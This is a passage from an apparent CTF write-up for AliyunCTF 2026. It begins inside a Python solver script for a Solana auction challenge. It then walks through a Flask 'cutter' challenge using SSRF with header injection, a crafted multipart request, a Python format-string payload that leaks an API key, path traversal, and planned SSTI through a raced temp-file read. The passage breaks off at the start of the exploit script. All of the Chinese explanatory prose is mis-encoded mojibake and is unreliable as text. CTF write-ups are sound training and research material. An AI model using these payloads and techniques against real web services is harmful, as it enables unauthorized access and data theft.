punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> player_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># player (signer, mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> my_auction<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># my_auction (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> my_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># my_bidder_state (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> admin_id<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># admin (mut)</span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> exploit_pda<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># exploit_pda </span>        <span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> exploit_bidder_state<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># exploit_bidder_state (mut)</span>    <span class="token punctuation">]</span>    <span class="token comment"># Wait for "num accounts: "</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        chunk <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>chunk<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"num accounts: "</span> <span class="token keyword">in</span> chunk<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending num accounts: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>accounts<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>accounts<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># Send accounts</span>    <span class="token keyword">for</span> is_signer<span class="token punctuation">,</span> is_writable<span class="token punctuation">,</span> pubkey <span class="token keyword">in</span> accounts<span class="token punctuation">:</span>        meta <span class="token operator">=</span> <span class="token string">""</span>        <span class="token keyword">if</span> is_writable<span class="token punctuation">:</span> meta <span class="token operator">+=</span> <span class="token string">"w"</span>        <span class="token keyword">if</span> is_signer<span class="token punctuation">:</span> meta <span class="token operator">+=</span> <span class="token string">"s"</span>        <span class="token keyword">if</span> meta <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span> meta <span class="token operator">=</span> <span class="token string">"-"</span>  <span class="token comment"># Just something not empty</span>        pubkey_s <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58encode<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> pubkey_s <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>            pubkey_s <span class="token operator">=</span> <span class="token string">"11111111111111111111111111111111"</span>        line <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>meta<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pubkey_s<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending account: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>line<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># Wait for "ix len: "</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        chunk <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>chunk<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"ix len: "</span> <span class="token keyword">in</span> chunk<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token comment"># Data: global:solve</span>    data <span class="token operator">=</span> get_sighash<span class="token punctuation">(</span><span class="token string">"global:solve"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending data len: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># Just to be safe with timing</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending data bytes..."</span></span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for flag..."</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for flag..."</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span> <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2026/01/31/AliyunCTF2026/IMG-20260201170816221.png"></p><hr><h1 id="cutter"><a href="#cutter" class="headerlink" title="cutter"></a>cutter</h1><p>è¦è®¿é—® &#x2F;adminï¼Œå°±éœ€è¦å…ˆè·å– API_KEY</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">API_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>HOST <span class="token operator">=</span> <span class="token string">'127.0.0.1:5000'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/action'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span> ip <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'only localhost'</span><span class="token punctuation">,</span> <span class="token number">403</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token <span class="token operator">!=</span> API_KEY<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'unauth'</span><span class="token punctuation">,</span> <span class="token number">403</span>        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span>    act <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>action<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> act<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"echo"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token number">200</span>    <span class="token keyword">elif</span> act<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"debug"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> content<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'unkown action'</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/heartbeat'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">heartbeat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">,</span> <span class="token string">"default"</span><span class="token punctuation">)</span>    client <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'client'</span><span class="token punctuation">,</span> <span class="token string">"default"</span><span class="token punctuation">)</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">300</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"text too large"</span><span class="token punctuation">,</span> <span class="token number">400</span>    action <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"type"</span> <span class="token punctuation">:</span> <span class="token string">"echo"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    form_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'content'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">,</span> BytesIO<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'action'</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">,</span> BytesIO<span class="token punctuation">(</span>action<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'text/json'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"X-Token"</span> <span class="token punctuation">:</span> API_KEY<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    headers<span class="token punctuation">[</span>client<span class="token punctuation">]</span> <span class="token operator">=</span> token    response <span class="token operator">=</span> httpx<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>HOST<span class="token punctuation">&#125;</span></span><span class="token string">/action"</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> files<span class="token operator">=</span>form_data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token number">200</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'action failed'</span></span><span class="token punctuation">,</span> <span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ° &#x2F;action éœ€è¦æœ¬åœ°è®¿é—®ï¼Œä¸” debug æ¨¡å¼ä¸‹ä½¿ç”¨ <code>content.format(app)</code>ï¼Œè¿™é‡Œå¯ä»¥æ‰“ python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥æ³„æ¼å‡º API_KEY</p><p>æ‰€ä»¥éœ€è¦åœ¨ &#x2F;heartbeat æ‰“ä¸€ä¸ª ssrf åˆ° &#x2F;actionï¼Œæ³¨æ„åˆ°è¿™é‡Œ <code>headers[client] = token</code> å…è®¸æˆ‘ä»¬è‡ªå®šä¹‰è¯·æ±‚å¤´ç„¶åå‘é€ post è¯·æ±‚ï¼Œå¯ä»¥æœ¬åœ° nc æŠ“ä¸€ä¸‹æ­£å¸¸å‘é€åˆ° &#x2F;action çš„è¯·æ±‚ä¸ºï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/action</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:5000</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">python-httpx/0.28.1</span></span><span class="token header"><span class="token header-name keyword">X-Token</span><span class="token punctuation">:</span> <span class="token header-value">3cfdaad321617c9df34b8c682df97fe44838a065b8e33dd434af2a309e94b743</span></span><span class="token header"><span class="token header-name keyword">AAA</span><span class="token punctuation">:</span> <span class="token header-value">BBB</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">320</span></span>--0dd69a2236f11ddb1d73140d4d5c0e39<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="content"; filename="content"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span><span class="token text-plain">1--0dd69a2236f11ddb1d73140d4d5c0e39Content-Disposition: form-data; name="action"; filename="action"Content-Type: text/json&#123;"type": "echo"&#125;--0dd69a2236f11ddb1d73140d4d5c0e39--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ³¨å…¥ä¸€ä¸ªè‡ªå·±çš„ multipart åŒ…æ¥è¦†ç›– action å‚æ•°ï¼Œé€šè¿‡æ„é€  content é—­åˆ boundary å³å¯è¦†ç›–ï¼Œç„¶å content å‚æ•°è‡ªèº«çš„å†…å®¹è¿˜éœ€è¦æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ payload æ¥æ³„æ¼ API_KEYï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/action</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:5000</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">python-httpx/0.28.1</span></span><span class="token header"><span class="token header-name keyword">X-Token</span><span class="token punctuation">:</span> <span class="token header-value">3cfdaad321617c9df34b8c682df97fe44838a065b8e33dd434af2a309e94b743</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=a</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">405</span></span>--a<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="content"; filename="content"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span><span class="token text-plain">&#123;0.view_functions[admin].__globals__[API_KEY]&#125;--aContent-Disposition: form-data; name="action"; filename="a.json"Content-Type: application/json</span><span class="token application-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"debug"</span><span class="token punctuation">&#125;</span>--a----aContent-Disposition<span class="token operator">:</span> form-data; name=<span class="token string">"action"</span>; filename=<span class="token string">"action"</span>Content-Type<span class="token operator">:</span> text/json<span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"echo"</span><span class="token punctuation">&#125;</span>--a--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2026/01/31/AliyunCTF2026/IMG-20260202144442378.png"></p><p>è¿™æ ·å°±èƒ½è®¾ç½® Authorization å¤´è®¿é—® admin äº†</p><p>&#x2F;admin å¤„ <code>os.path.join</code> ä¸­ tmpl å‚æ•°å¯æ§æ˜æ˜¾å¯ä»¥ç›®å½•ç©¿è¶Šè¯»å–ä»»æ„æ–‡ä»¶</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token <span class="token operator">!=</span> API_KEY<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'unauth'</span><span class="token punctuation">,</span> <span class="token number">403</span>    tmpl <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tmpl'</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>    tmpl_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./templates'</span><span class="token punctuation">,</span> tmpl<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>tmpl_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Not Found'</span><span class="token punctuation">,</span> <span class="token number">404</span>    tmpl_content <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>tmpl_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>tmpl_content<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯ flag çš„ç”Ÿæˆæ–¹å¼ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$FLAG</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$FLAG</span>"</span> <span class="token operator">></span> <span class="token string">"/flag-<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-dc</span> <span class="token string">'a-f0-9'</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">32</span><span class="token variable">)</span></span>.txt"</span>    <span class="token builtin class-name">unset</span> FLAG<span class="token keyword">else</span>    <span class="token builtin class-name">echo</span> <span class="token string">"flag&#123;testflag&#125;"</span> <span class="token operator">></span> <span class="token string">"/flag-<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-dc</span> <span class="token string">'a-f0-9'</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">32</span><span class="token variable">)</span></span>.txt"</span><span class="token keyword">fi</span><span class="token function">useradd</span> <span class="token parameter variable">-M</span> ctf<span class="token function">su</span> ctf <span class="token parameter variable">-c</span> <span class="token string">'cd /app &amp;&amp; python app.py'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„å‘³ç€å¿…é¡»æƒ³åŠæ³•åˆ—å‡ºç›®å½•è·å– flag è·¯å¾„ï¼Œæ³¨æ„åˆ° render_template_string æ­¤å¤„çš„ tmpl_content å¯ä»¥æ‰“ sstiï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶å†…å®¹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œä½†æ˜¯ flask çš„æ—¥å¿—æ˜¯å†™åœ¨ ByteIO çš„ï¼Œæ²¡æœ‰æ–‡ä»¶è½åœ°</p><p>æƒ³èµ·æ¥ p ç¥ä¹‹å‰åœ¨ php ä¸­æ‰“è¿‡<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">ä¸´æ—¶æ–‡ä»¶ç«äº‰åŒ…å«</a>çš„æ“ä½œï¼ŒçŒœæµ‹ flask ä¸­ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…ä¹Ÿä¼šå†™å…¥åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆè¿™ä¸ªä¸´æ—¶æ–‡ä»¶çš„å†…å®¹æˆ‘ä»¬åªèƒ½é€šè¿‡çˆ†ç ´ fd å¥æŸ„æ¥å¾—çŸ¥ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ç«äº‰è¯»å–</p><p>äºæ˜¯å°è¯•åœ¨ &#x2F;heartbeat ä¸Šä¼ å¤§æ–‡ä»¶ï¼ŒæŠŠ ssti payload æ”¾åœ¨æœ€å‰é¢ï¼Œç„¶ååœ¨ &#x2F;admin åŒ…å« fd æ‰“ ssti</p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span 